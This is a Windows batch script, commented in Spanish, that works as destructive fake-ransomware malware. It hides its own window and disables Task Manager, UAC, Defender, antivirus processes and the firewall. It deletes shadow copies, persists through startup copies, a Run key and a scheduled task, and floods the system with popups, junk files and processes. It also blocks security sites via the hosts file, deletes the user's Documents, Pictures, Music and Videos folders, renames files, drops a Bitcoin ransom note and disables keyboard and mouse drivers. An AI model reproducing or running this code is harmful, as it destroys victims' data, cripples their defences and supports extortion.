@echo off
color 0c
title CAOS TOTAL - EDICION EXTREMA
mode con: cols=80 lines=25

:: Ocultar ventana principal
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)
exit

:begin
:: Deshabilitar protecciones del sistema (más agresivo)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1

:: Matar procesos de seguridad comunes
taskkill /f /im MsMpEng.exe >nul 2>&1
taskkill /f /im NisSrv.exe >nul 2>&1
taskkill /f /im SecurityHealthService.exe >nul 2>&1
taskkill /f /im Defender.exe >nul 2>&1
taskkill /f /im avp.exe >nul 2>&1
taskkill /f /im avguard.exe >nul 2>&1

:: Deshabilitar Windows Defender y Firewall (con PowerShell)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
netsh advfirewall set allprofiles state off >nul 2>&1

:: Eliminar puntos de restauración y sombras
vssadmin delete shadows /all /quiet >nul 2>&1
wmic shadowcopy delete >nul 2>&1

:: Persistencia: copiarse en múltiples lugares y ejecutarse al inicio
copy "%~f0" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\sistema.bat" >nul 2>&1
copy "%~f0" "%UserProfile%\Documents\windows_update.bat" >nul 2>&1
copy "%~f0" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\helper.bat" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /t REG_SZ /d "%~f0" /f >nul 2>&1
schtasks /create /tn "MicrosoftUpdate" /tr "%~f0" /sc minute /mo 1 /f >nul 2>&1

:: 1. Ventanas emergentes masivas (10000 en lugar de 1000)
for /l %%x in (1, 1, 10000) do (
    start "" msg * "¡SISTEMA DESTRUIDO! Todos tus datos han sido cifrados."
    if %%x equ 5000 start "" msg * "¡PAGA 1 BITCOIN PARA RECUPERAR TUS ARCHIVOS!"
    if %%x equ 9000 start "" msg * "¡REINICIANDO EN 10 SEGUNDOS! (Mentira, seguirá el caos)"
)

:: 2. Efectos visuales extremos + parpadeo de pantalla
echo @echo off > "%temp%\visual.bat"
echo :visual >> "%temp%\visual.bat"
echo for /l %%%%i in (1,1,200) do ( >> "%temp%\visual.bat"
echo     set /a color=%%%%random %%%% 16 >> "%temp%\visual.bat"
echo     color %%%%color%% >> "%temp%\visual.bat"
echo ) >> "%temp%\visual.bat"
echo timeout /t 0 /nobreak ^> nul >> "%temp%\visual.bat"
echo goto visual >> "%temp%\visual.bat"
start /min "" "%temp%\visual.bat"

:: 3. Cambiar fondo de pantalla cada 0.5 segundos + texto aterrador
echo @echo off > "%temp%\fondo.bat"
echo :fondo >> "%temp%\fondo.bat"
echo set /a num=^!random! %%%% 100 + 1 >> "%temp%\fondo.bat"
echo reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\Web\Wallpaper\Windows\img!num!.jpg" /f >> "%temp%\fondo.bat"
echo reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f >> "%temp%\fondo.bat"
echo powershell -Command "$msg = '¡INFECTADO!'; $wshell = New-Object -ComObject Wscript.Shell; $wshell.Popup($msg,0,'ALERTA',48)" >> "%temp%\fondo.bat"
echo rundll32.exe user32.dll,UpdatePerUserSystemParameters >> "%temp%\fondo.bat"
echo timeout /t 0 /nobreak ^> nul >> "%temp%\fondo.bat"
echo goto fondo >> "%temp%\fondo.bat"
start /min "" "%temp%\fondo.bat"

:: 4. Inundar escritorio y todas las unidades con archivos basura
echo @echo off > "%temp%\inundar.bat"
echo :inundar >> "%temp%\inundar.bat"
echo set /a num=^!random! %%%% 500 + 1 >> "%temp%\inundar.bat"
echo echo "PAGUE RESCATE" ^> "%UserProfile%\Desktop\RESCATE!num!.txt" >> "%temp%\inundar.bat"
echo echo "SISTEMA COMPROMETIDO" ^> "C:\BASURA!num!.txt" >> "%temp%\inundar.bat"
echo echo "Virus activo" ^> "D:\INFECCION!num!.txt" >> "%temp%\inundar.bat"
echo echo @echo off ^> "%UserProfile%\Desktop\ejecutar!num!.bat" >> "%temp%\inundar.bat"
echo echo start "" msg * "¡TODOS TUS ARCHIVOS FUERON ELIMINADOS!" ^>^> "%UserProfile%\Desktop\ejecutar!num!.bat" >> "%temp%\inundar.bat"
echo timeout /t 0 /nobreak ^> nul >> "%temp%\inundar.bat"
echo goto inundar >> "%temp%\inundar.bat"
start /min "" "%temp%\inundar.bat"

:: 5. Abrir aplicaciones y procesos infinitos (consumir RAM/CPU)
echo @echo off > "%temp%\apps.bat"
echo :apps >> "%temp%\apps.bat"
echo for /l %%%%i in (1,1,20) do ( >> "%temp%\apps.bat"
echo     start chrome.exe >> "%temp%\apps.bat"
echo     start notepad.exe >> "%temp%\apps.bat"
echo     start explorer.exe >> "%temp%\apps.bat"
echo     start cmd.exe >> "%temp%\apps.bat"
echo     start mspaint.exe >> "%temp%\apps.bat"
echo     start calc.exe >> "%temp%\apps.bat"
echo     start wordpad.exe >> "%temp%\apps.bat"
echo     start control.exe >> "%temp%\apps.bat"
echo     start taskmgr.exe >> "%temp%\apps.bat"
echo     start powershell.exe >> "%temp%\apps.bat"
echo ) >> "%temp%\apps.bat"
echo timeout /t 1 /nobreak ^> nul >> "%temp%\apps.bat"
echo goto apps >> "%temp%\apps.bat"
start /min "" "%temp%\apps.bat"

:: 6. Reinicio forzado en 1 minuto (no cancelable) + pantalla azul falsa
shutdown /r /t 60 /c "CRITICAL PROCESS DIED - Windows se cerrará en 60 segundos" /f
echo @echo off > "%temp%\bsod.bat"
echo :bsod >> "%temp%\bsod.bat"
echo color 17 >> "%temp%\bsod.bat"
echo cls >> "%temp%\bsod.bat"
echo echo ===================================================== >> "%temp%\bsod.bat"
echo echo          ***  PANTALLA AZUL SIMULADA  *** >> "%temp%\bsod.bat"
echo echo ===================================================== >> "%temp%\bsod.bat"
echo echo. >> "%temp%\bsod.bat"
echo echo ERROR: KMODE_EXCEPTION_NOT_HANDLED >> "%temp%\bsod.bat"
echo echo *** STOP: 0x0000001E (0xFFFFFFFF, 0x00000000, 0x00000000) >> "%temp%\bsod.bat"
echo echo *** Windows se ha bloqueado para evitar daños en el sistema >> "%temp%\bsod.bat"
echo timeout /t 2 /nobreak ^> nul >> "%temp%\bsod.bat"
echo goto bsod >> "%temp%\bsod.bat"
start /min "" "%temp%\bsod.bat"

:: 7. Advertencias infinitas más agresivas (cada 1 segundo)
echo @echo off > "%temp%\advertencias.bat"
echo :advertencia >> "%temp%\advertencias.bat"
echo msg * "¡TUS ARCHIVOS ESTÁN SIENDO CIFRADOS! Contacta a rescate@virus.com" >> "%temp%\advertencias.bat"
echo msg * "¡DISCO DURO FORMATEADO! (Simulado, pero tus datos corren peligro)" >> "%temp%\advertencias.bat"
echo msg * "¡Virus detectado! Se recomienda apagar inmediatamente. Demasiado tarde." >> "%temp%\advertencias.bat"
echo timeout /t 1 /nobreak ^> nul >> "%temp%\advertencias.bat"
echo goto advertencia >> "%temp%\advertencias.bat"
start /min "" "%temp%\advertencias.bat"

:: 8. Efectos de sonido continuos + pitidos de la placa madre
echo @echo off > "%temp%\sonido.bat"
echo :sonido >> "%temp%\sonido.bat"
echo for /l %%%%i in (1,1,50) do ( >> "%temp%\sonido.bat"
echo     echo ^g >> "%temp%\sonido.bat"
echo ) >> "%temp%\sonido.bat"
echo powershell -Command "[Console]::Beep(1000,500)" >> "%temp%\sonido.bat"
echo powershell -Command "[Console]::Beep(200,200)" >> "%temp%\sonido.bat"
echo powershell -Command "[Console]::Beep(5000,100)" >> "%temp%\sonido.bat"
echo timeout /t 1 /nobreak ^> nul >> "%temp%\sonido.bat"
echo goto sonido >> "%temp%\sonido.bat"
start /min "" "%temp%\sonido.bat"

:: 9. Bloquear ratón y teclado cada 10 segundos + mover ratón aleatoriamente
echo @echo off > "%temp%\bloqueo.bat"
echo :bloqueo >> "%temp%\bloqueo.bat"
echo rundll32.exe user32.dll,LockWorkStation >> "%temp%\bloqueo.bat"
echo powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080))" >> "%temp%\bloqueo.bat"
echo timeout /t 10 /nobreak ^> nul >> "%temp%\bloqueo.bat"
echo goto bloqueo >> "%temp%\bloqueo.bat"
start /min "" "%temp%\bloqueo.bat"

:: 10. Modificar archivo hosts para bloquear sitios de antivirus y Windows Update
echo 127.0.0.1 www.microsoft.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 update.microsoft.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 www.symantec.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 www.kaspersky.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 www.avg.com >> %SystemRoot%\System32\drivers\etc\hosts

:: 11. Eliminar archivos del usuario (Documentos, Imágenes, Música, Videos)
rmdir /s /q "%UserProfile%\Documents" >nul 2>&1
rmdir /s /q "%UserProfile%\Pictures" >nul 2>&1
rmdir /s /q "%UserProfile%\Music" >nul 2>&1
rmdir /s /q "%UserProfile%\Videos" >nul 2>&1

:: 12. Crear un ransomware falso (cambiar extensiones de archivos)
for /r "%UserProfile%\Desktop" %%f in (*.txt, *.docx, *.xlsx, *.jpg, *.png) do (
    ren "%%f" "%%~nf.ENCRIPTADO" >nul 2>&1
)

:: 13. Mensaje de rescate en el escritorio
echo ====================================================== > "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo            ¡SUS ARCHIVOS HAN SIDO CIFRADOS!           >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo ====================================================== >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo. >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo Para recuperar sus datos debe pagar 1 Bitcoin a la direccion: >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo. >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo Una vez realizado el pago, envie un correo a rescate@virus.com con su ID >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
echo Tiene 72 horas. Pasado ese tiempo los datos se perderan para siempre. >> "%UserProfile%\Desktop\LEEME_RESCATE.txt"
start notepad "%UserProfile%\Desktop\LEEME_RESCATE.txt"

:: 14. Deshabilitar teclado y mouse por completo (requiere reinicio para revertir)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\i8042prt" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass" /v Start /t REG_DWORD /d 4 /f >nul 2>&1

:: 15. Mensaje final de "éxito"
cls
echo ======================================================
echo    EL CAOS TOTAL HA SIDO IMPLEMENTADO CON EXITO
echo    SU SISTEMA HA SIDO COMPROMETIDO IRREVERSIBLEMENTE
echo    PREPARE SU PC PARA EL FORMATEO (o pague rescate)
echo ======================================================
timeout /t 5 /nobreak > nul
exit